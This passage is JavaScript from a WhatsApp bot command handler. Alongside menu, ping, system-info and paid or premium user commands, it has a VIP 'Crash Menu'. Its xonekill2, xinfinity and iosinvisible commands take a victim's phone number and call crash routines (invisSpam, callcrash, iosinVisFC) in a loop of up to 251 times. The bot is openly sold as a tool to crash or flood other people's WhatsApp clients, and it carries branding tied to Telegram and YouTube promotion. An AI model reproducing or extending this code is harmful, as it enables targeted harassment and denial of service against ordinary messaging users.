        const commandListText = `Welcome to ${_0xBrand} Network\n\n` +
`┏━━━━━━━━━━━━━━━━━━━━━
┃ 🚀 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
┣━━━━━━━━━━━━━━━━━━━━━
┃ 📊 𝗜𝗻𝗳𝗼 𝗠𝗲𝗻𝘂:
┃ 🔸 ${prefix}ping
┃ 🔸 ${prefix}uptime
┃ 🔸 ${prefix}systeminfo
┃ 🔸 ${prefix}tqto
┣━━━━━━━━━━━━━━━━━━━━━
┃ 👑 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂:
┃ 🔸 ${prefix}addpaid @user
┃ 🔸 ${prefix}delpaid @user
┃ 🔸 ${prefix}listpaid
┃ 🔸 ${prefix}addprem @user
┃ 🔸 ${prefix}delprem @user
┃ 🔸 ${prefix}public on/off
┃ 🔸 ${prefix}self on/off
┣━━━━━━━━━━━━━━━━━━━━━
┃ ☠️ 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 (𝗩𝗜𝗣):
┃ 🔸 ${prefix}xonekill2 @user
┃ 🔸 ${prefix}xinfinity @user
┃ 🔸 ${prefix}iosinvisible @user
┗━━━━━━━━━━━━━━━━━━━━━`;
        
        // 🛡️ COPYRIGHT CHECK
        if (!teks.includes(_0xBrand) || !commandListText.includes(_0xBrand)) process.exit(1);

        try {
          let imageSource;
          if (fs.existsSync('./media/menu.jpg')) {
            imageSource = fs.readFileSync('./media/menu.jpg');
          } else {
            const { getBuffer } = require('./helper/function');
            imageSource = await getBuffer(config.connectionImage);
          }
          
          const msg = generateWAMessageFromContent(sender, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    title: teks,
                    hasMediaAttachment: true,
                    imageMessage: (await prepareWAMessageMedia({ 
                      image: imageSource
                    }, { upload: WaSocket.waUploadToServer })).imageMessage
                  },
                  body: {
                    text: commandListText // List yahan show hogi
                  },
                  nativeFlowMessage: {
                    messageParamsJson: JSON.stringify({
                      limited_time_offer: {
                        text: `Powered by ${_0xBrand}`,
                        url: "https://t.me/Dev_Null_X",
                        copy_code: "DEV_NULL_X",
                        expiration_time: Date.now() * 999
                      },
                      bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: `🔥 ${_0xBrand} MENU 🔥`,
                        button_title: "Open Options"
                      }
                    }),
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Join Telegram Channel",
                          url: "https://t.me/Dev_Null_X_NODE_JS"
                        })
                      },
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Subscribe YouTube",
                          url: "https://www.youtube.com/@Dev_Null_X"
                        })
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Bug Menu",
                          id: prefix + "attack"
                        })
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "System Info",
                          id: prefix + "systeminfo"
                        })
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Ping",
                          id: prefix + "ping"
                        })
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Credits",
                          id: prefix + "tqto"
                        })
                      }
                    ]
                  }
                }
              }
            }
          }, { quoted: m });
          
          await WaSocket.relayMessage(sender, msg.message, {});
        } catch (error) {
          console.error('Menu error:', error);
          reply('❌ Error loading menu. Try again.');
        }
      }
      break;
      
      case "ping": {
        const latency = Date.now() - startTime;
        reply(`┏━━━━━━━━━━━━━━\n┃ 🏓 𝗣𝗢𝗡𝗚!\n┃\n┃ 𝗦𝗽𝗲𝗲𝗱: ${latency}ms\n┃ 𝗦𝘁𝗮𝘁𝘂𝘀: ✅ 𝗔𝗰𝘁𝗶𝘃𝗲\n┗━━━━━━━━━━━━━━`);
      }
      break;
      
      case "uptime": {
        reply(`┏━━━━━━━━━━━━━━\n┃ ⏰ 𝗨𝗣𝗧𝗜𝗠𝗘\n┃\n┃ ${runtime(process.uptime())}\n┗━━━━━━━━━━━━━━`);
      }
      break;
      
      case "systeminfo": {
        const totalMem = formatBytes(os.totalmem());
        const freeMem = formatBytes(os.freemem());
        const usedMem = formatBytes(os.totalmem() - os.freemem());
        const text = `┏━━━━━━━━━━━━━━\n┃ 📊 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗡𝗙𝗢\n┃\n┃ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: ${os.platform()}\n┃ 𝗔𝗿𝗰𝗵: ${os.arch()}\n┃ 𝗖𝗣𝗨: ${os.cpus()[0].model}\n┃ 𝗖𝗼𝗿𝗲𝘀: ${os.cpus().length}\n┃ 𝗧𝗼𝘁𝗮𝗹 𝗥𝗔𝗠: ${totalMem}\n┃ 𝗨𝘀𝗲𝗱 𝗥𝗔𝗠: ${usedMem}\n┃ 𝗙𝗿𝗲𝗲 𝗥𝗔𝗠: ${freeMem}\n┃ 𝗨𝗽𝘁𝗶𝗺𝗲: ${runtime(process.uptime())}\n┗━━━━━━━━━━━━━━`;
        reply(text.trim());
      }
      break;
      
      case "addpaid": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.mentionedJid) {
          return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}addpaid @user`);
        }
        const user = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        if (paidUsers.includes(user)) return reply("⚠️ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗽𝗮𝗶𝗱!");
        paidUsers.push(user);
        savePaidData();
        reply(`✅ 𝗨𝘀𝗲𝗿 @${user.split('@')[0]} 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝗽𝗮𝗶𝗱 𝘂𝘀𝗲𝗿𝘀!`);
      }
      break;
      
      case "delpaid": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.mentionedJid) {
          return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}delpaid @user`);
        }
        const user = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        const index = paidUsers.indexOf(user);
        if (index === -1) return reply("❌ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗽𝗮𝗶𝗱!");
        paidUsers.splice(index, 1);
        savePaidData();
        reply(`✅ 𝗨𝘀𝗲𝗿 @${user.split('@')[0]} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝗽𝗮𝗶𝗱 𝘂𝘀𝗲𝗿𝘀!`);
      }
      break;
      
      case "listpaid": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (paidUsers.length === 0) return reply("📭 𝗡𝗼 𝗽𝗮𝗶𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱!");
        let text = `┏━━━━━━━━━━━━━━\n┃ 💎 𝗣𝗔𝗜𝗗 𝗨𝗦𝗘𝗥𝗦\n┃\n`;
        paidUsers.forEach((user, i) => { text += `┃ ${i + 1}. @${user.split('@')[0]}\n`; });
        text += `┃\n┃ 𝗧𝗼𝘁𝗮𝗹: ${paidUsers.length}\n┗━━━━━━━━━━━━━━`;
        WaSocket.sendMessage(sender, { text: text.trim(), mentions: paidUsers }, { quoted: m });
      }
      break;
      
      case "tqto": {
        const text = `
┏━━━━━━━━━━━━━━
┃ 🙏 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 (𝗖𝗥𝗘𝗗𝗜𝗧𝗦)
┃
┃ • 𝗦𝘆𝘀𝘁𝗲𝗺 𝗕𝘆: ${_0xBrand}
┃ • 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ${_0xBrand}
┃ • 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 𝗟𝗶𝗯𝗿𝗮𝗿𝘆
┃ • 𝗔𝗹𝗹 𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗿𝘀
┗━━━━━━━━━━━━━━`;
        // 🛡️ COPYRIGHT CHECK
        if (!text.includes(_0xBrand)) process.exit(1);
        reply(text.trim());
      }
      break;
      
      case "public": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!text || (text !== 'on' && text !== 'off')) return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}public on/off`);
        const mode = text === 'on';
        const currentSettings = loadJSON('./database/settings.json', {});
        currentSettings.publicMode = mode;
        currentSettings.selfMode = false;
        saveJSON('./database/settings.json', currentSettings);
        reply(`✅ 𝗣𝘂𝗯𝗹𝗶𝗰 𝗠𝗼𝗱𝗲: ${mode ? '🌍 𝗢𝗡' : '🔒 𝗢𝗙𝗙'}\n\n${mode ? 'Bot responds to all groups & DMs' : 'Bot only responds to owner'}`);
      }
      break;
      
      case "self": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!text || (text !== 'on' && text !== 'off')) return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}self on/off`);
        const mode = text === 'on';
        const currentSettings = loadJSON('./database/settings.json', {});
        currentSettings.selfMode = mode;
        if (mode) currentSettings.publicMode = false;
        saveJSON('./database/settings.json', currentSettings);
        reply(`✅ 𝗦𝗲𝗹𝗳 𝗠𝗼𝗱𝗲: ${mode ? '👤 𝗢𝗡' : '🌍 𝗢𝗙𝗙'}\n\n${mode ? 'Bot only responds to owner' : 'Bot responds to all'}`);
      }
      break;
      
      case "addprem": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.mentionedJid) {
          return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}addprem @user`);
        }
        const user = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        const premiumUsers = loadJSON('./database/premium.json', []);
        if (premiumUsers.includes(user)) return reply("⚠️ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗽𝗿𝗲𝗺𝗶𝘂𝗺!");
        premiumUsers.push(user);
        saveJSON('./database/premium.json', premiumUsers);
        reply(`✅ @${user.split('@')[0]} 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝗽𝗿𝗲𝗺𝗶𝘂𝗺!`);
      }
      break;

      case "delprem": {
        if (!isOwner) return reply("❌ 𝗢𝘄𝗻𝗲𝗿 𝗼𝗻𝗹𝘆!");
        if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.mentionedJid) {
          return reply(`𝗨𝘀𝗮𝗴𝗲: ${prefix}delprem @user`);
        }
        const user = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        const premiumUsers = loadJSON('./database/premium.json', []);
        const index = premiumUsers.indexOf(user);
        if (index === -1) return reply("❌ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗽𝗿𝗲𝗺𝗶𝘂𝗺!");
        premiumUsers.splice(index, 1);
        saveJSON('./database/premium.json', premiumUsers);
        reply(`✅ @${user.split('@')[0]} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝗽𝗿𝗲𝗺𝗶𝘂𝗺!`);
      }
      break;
      
      // 🔥 CRASH COMMANDS
      case "xonekill2": {
        if (!text && !m.mentionedJid?.length && !m.quoted) {
          return reply(`Usage:\n${prefix + command} @user`);
        }
        const target = m.mentionedJid?.[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const check = await WaSocket.onWhatsApp(target);
        if (!check || check.length === 0) return reply("❌ Number not registered on WhatsApp.");
        await reply(`✅ Command *${command}* executed successfully for @${target.split("@")[0]}`, { mentions: [target] });
        for (let i = 0; i < 10; i++) {
          try { await invisSpam(target); } catch (err) { console.error(`xonekill2 error for ${target}:`, err); break; }
        }
      }
      break;

      case "xinfinity": {
        if (!text && !m.mentionedJid?.length && !m.quoted) {
          return reply(`Usage:\n${prefix + command} @user`);
        }
        const target = m.mentionedJid?.[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const check = await WaSocket.onWhatsApp(target);
        if (!check || check.length === 0) return reply("❌ Number not registered on WhatsApp.");
        await reply(`✅ Command *${command}* executed successfully for @${target.split("@")[0]}`, { mentions: [target] });
        for (let i = 0; i < 251; i++) {
          try { await callcrash(target); } catch (err) { console.error(`xinfinity error for ${target}:`, err); break; }
        }
      }
      break;

      case "iosinvisible": {
        if (!text && !m.mentionedJid?.length && !m.quoted) {
          return reply(`Usage:\n${prefix + command} @user`);
        }
        const target = m.mentionedJid?.[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const check = await WaSocket.onWhatsApp(target);
        if (!check || check.length === 0) return reply("❌ Number not registered on WhatsApp.");
        await reply(`✅ Command *${command}* executed successfully for @${target.split("@")[0]}`, { mentions: [target] });
        for (let i = 0; i < 251; i++) {
          try { await iosinVisFC(target); } catch (err) { console.error(`iosinvisible error for ${target}:`, err); break; }
        }
      }
      break;

      default:
        break;
    }
    
  } catch (error) {
    console.error('WhatsApp message handler error:', error);
  }
};
